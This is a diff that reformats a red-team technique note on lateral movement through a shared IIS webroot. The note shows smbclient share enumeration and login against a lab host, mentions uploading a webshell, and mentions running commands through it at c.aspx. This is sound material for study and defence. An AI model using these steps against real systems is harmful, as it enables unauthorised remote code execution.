@@ -1,5 +1,6 @@
 ---
 description: Lateral Movement
+tags: [#lateral-movement]
 ---
 
 # Shared Webroot
@@ -8,8 +9,8 @@ description: Lateral Movement
 
 Enumerating victim host `10.0.0.6` for any shares:
 
-{% code title="attacker@local" %}
 ```csharp
+// attacker@local
 smbclient -L //10.0.0.6 -U spot
 
 WARNING: The "syslog" option is deprecated
@@ -28,12 +29,11 @@ Enter WORKGROUP\spot's password:
 	transcripts     Disk      
 	wwwroot         Disk      
 ```
-{% endcode %}
 
 Logging in to the `wwwroot` share:
 
-{% code title="attacker@local" %}
 ```csharp
+// attacker@local
 smbclient //10.0.0.6/wwwroot -U spot
 
 WARNING: The "syslog" option is deprecated
@@ -46,7 +46,6 @@ smb: \> ls
   iis-85.png                          A    99710  Tue Jul 31 19:35:48 2018
   iisstart.htm                        A        3  Tue Jul 31 19:38:23 2018
 ```
-{% endcode %}
 
 Uploading a webshell into the `wwwroot`:
 
@@ -67,19 +66,19 @@ smb: \> ls
 
 Same as above in a picture:
 
-![](../../.gitbook/assets/webroot-ownage.png)
+![[webroot-ownage.png]]
 
 Attacker can now access the newly uploaded webshell via `http://10.0.0.6/c.aspx` and start executing commands:
 
-![](../../.gitbook/assets/webroot-rce.png)
+![[webroot-rce.png]]
 
 ## Observations
 
 See T1108: Webshells for observations:
 
-{% page-ref page="../privilege-escalation/t1108-redundant-access.md" %}
+
 
 ## References
 
-{% embed url="https://attack.mitre.org/wiki/Technique/T1051" %}
+[attack.mitre.org/wiki/Technique/T1051](https://attack.mitre.org/wiki/Technique/T1051)
 
